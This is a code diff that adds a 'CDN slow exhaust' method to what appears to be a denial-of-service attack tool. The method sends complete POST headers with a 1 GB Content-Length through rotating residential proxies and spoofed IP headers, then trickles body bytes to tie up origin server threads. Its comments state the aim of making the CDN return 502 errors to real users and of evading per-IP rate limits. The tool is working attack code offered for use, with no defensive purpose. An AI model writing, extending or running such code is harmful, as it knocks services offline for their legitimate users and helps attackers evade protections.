@@ -2037,6 +2037,139 @@ async function runSlowlorisReal(
 }
 
 // ─────────────────────────────────────────────────────────────────────────
+//  CDN SLOW EXHAUST — exhausts GoCache/CDN→origin connection pool
+//
+//  Key difference from slowloris: sends COMPLETE valid headers so GoCache
+//  forwards the request to the origin server. Then trickles a huge POST
+//  body (1 byte / 8-18s) — origin holds its thread slot open waiting for
+//  the full body. After ~200 concurrent connections, GoCache runs out of
+//  backend slots and returns 502 Bad Gateway to all real users.
+//
+//  Uses residential slow-proxy tier so each connection appears from a
+//  different IP, bypassing GoCache's per-IP rate limits.
+// ─────────────────────────────────────────────────────────────────────────
+async function runCDNSlowExhaust(
+  resolvedHost: string,
+  hostname: string,
+  targetPort: number,
+  threads: number,
+  proxies: ProxyConfig[],
+  signal: AbortSignal,
+  onStats: (p: number, b: number, c?: number) => void,
+  useHttps = true,
+): Promise<void> {
+  const MAX_CONN = !IS_PROD
+    ? Math.min(threads * 8, 600)
+    : IS_DEPLOYED ? Math.min(threads * 60, 25000) : Math.min(threads * 40, 12000);
+
+  let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
+  const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 250);
+
+  const SLOW_PATHS = [
+    "/search", "/buscar", "/pesquisa", "/resultados", "/?s=",
+    "/wp-login.php", "/wp-admin/", "/admin/", "/login",
+    "/contato", "/contact", "/fale-conosco",
+    "/index.php", "/feed/", "/sitemap.xml",
+    "/loja/", "/shop/", "/produtos/", "/categoria/",
+    "/checkout", "/cart", "/carrinho",
+  ];
+  const slowPath = () => {
+    const p = SLOW_PATHS[Math.floor(Math.random() * SLOW_PATHS.length)];
+    return `${p}?_=${Date.now()}&r=${randStr(10)}&nc=${randInt(1, 99999999)}`;
+  };
+
+  const oneCDNSlowConn = (): Promise<void> => new Promise(async (resolve) => {
+    if (signal.aborted) { resolve(); return; }
+    let sock: net.Socket;
+
+    try {
+      if (proxies.length > 0) {
+        sock = await mkTLSSock(proxies, pIdx++ % Math.max(1, proxies.length), resolvedHost, hostname, targetPort, ["http/1.1"]);
+      } else {
+        sock = useHttps
+          ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
+          : net.createConnection({ host: resolvedHost, port: targetPort });
+        await new Promise<void>((res, rej) => {
+          if (useHttps) (sock as tls.TLSSocket).once("secureConnect", res);
+          else sock.once("connect", res);
+          sock.once("error", rej);
+        });
+      }
+    } catch { resolve(); return; }
+
+    sock.setNoDelay(true);
+    sock.setTimeout(240_000);
+    activeConns++;
+    localPkts++;
+
+    let keepIv: NodeJS.Timeout | null = null;
+    let settled = false;
+    const done = () => {
+      if (settled) return;
+      settled = true;
+      activeConns = Math.max(0, activeConns - 1);
+      if (keepIv) { clearInterval(keepIv); keepIv = null; }
+      try { sock.destroy(); } catch { /**/ }
+      resolve();
+    };
+    sock.once("error", done);
+    sock.once("close", done);
+    sock.once("timeout", done);
+    signal.addEventListener("abort", done, { once: true });
+
+    // COMPLETE headers — GoCache sees a valid request and MUST forward to origin
+    // POST with 1 GB Content-Length → origin parks the thread waiting for body
+    const path = slowPath();
+    const headers = [
+      `POST ${path} HTTP/1.1`,
+      `Host: ${hostname}`,
+      `User-Agent: ${randUA()}`,
+      `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
+      `Accept-Language: pt-BR,pt;q=0.9,en;q=0.8`,
+      `Accept-Encoding: gzip, deflate, br`,
+      `Connection: keep-alive`,
+      `Cache-Control: no-cache, no-store, must-revalidate`,
+      `Pragma: no-cache`,
+      `X-Forwarded-For: ${randIp()}`,
+      `X-Real-IP: ${randIp()}`,
+      `Referer: https://www.google.com.br/search?q=${encodeURIComponent(hostname)}`,
+      `Origin: https://${hostname}`,
+      `Content-Type: application/x-www-form-urlencoded`,
+      `Content-Length: 1073741824`,
+      `\r\n`,   // ← blank line = headers complete, body starts
+    ].join("\r\n");
+
+    const writeErr = await new Promise<Error | null>(res => {
+      sock.write(headers, err => res(err ?? null));
+    });
+    if (writeErr || signal.aborted) { done(); return; }
+    localBytes += headers.length;
+
+    // Trickle body: 1-4 bytes every 8-18 seconds — origin keeps waiting indefinitely
+    keepIv = setInterval(() => {
+      if (signal.aborted || sock.destroyed) { done(); return; }
+      const chunk = `${randStr(randInt(1, 3))}=`;
+      sock.write(chunk, err => {
+        if (err) done();
+        else { localPkts++; localBytes += chunk.length; }
+      });
+    }, randInt(8_000, 18_000));
+  });
+
+  const runSock = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await oneCDNSlowConn();
+      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 10));
+    }
+  };
+
+  await Promise.all(Array.from({ length: MAX_CONN }, runSock));
+  clearInterval(flushIv);
+  flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
 //  CONNECTION FLOOD — pure TCP/TLS connection table exhaustion
 //  Opens MAX_CONN connections, completes TLS handshake, holds them open
 //  Bypasses ALL HTTP-level rate limiting (nginx limit_req, Cloudflare, etc)
@@ -7772,6 +7905,11 @@ async function runWorker() {
   } else if (cfg.method === "http2-flood") {
     // Native HTTP/2 with multiplexed streams (node:http2)
     await runHTTP2Flood(resolvedHost, sniName, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "cdn-slow-exhaust") {
+    // CDN Pool Exhaust: COMPLETE headers forwarded through CDN → origin holds thread
+    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
+    await runCDNSlowExhaust(resolvedHost, sniName, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats, isHttps);
 
   } else if (cfg.method === "slowloris") {
     // Real Slowloris: half-open TLS/TCP connections — auto-detects HTTPS
